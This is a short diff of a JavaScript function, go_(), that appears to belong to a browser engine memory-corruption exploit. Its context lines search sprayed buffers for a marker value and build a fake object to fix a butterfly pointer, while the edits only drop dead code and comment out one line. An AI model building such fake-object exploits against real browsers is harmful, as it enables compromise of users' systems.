@@ -162,15 +162,6 @@ function go_() {
 		var f1 = 0;
 		var x = [];
 	}
-	
-	if(document != document){
-		for(var i = 0; i < 5; i++){
-			var x=0;
-		}
-		var fp = {};
-		var f1 = 0;
-		var x = [];
-	}
 
 	stale[0] += 0x101;
 
@@ -181,7 +172,7 @@ function go_() {
 			if(bufs[i][k] == 0x41414242) {
 				// Create fakeobj for fixing butterfly ptr
 				stale[0] = fakeobj;
-				var fop = bufs[i][k];
+				//var fop = bufs[i][k];
  			
 
 				stale[0] = {
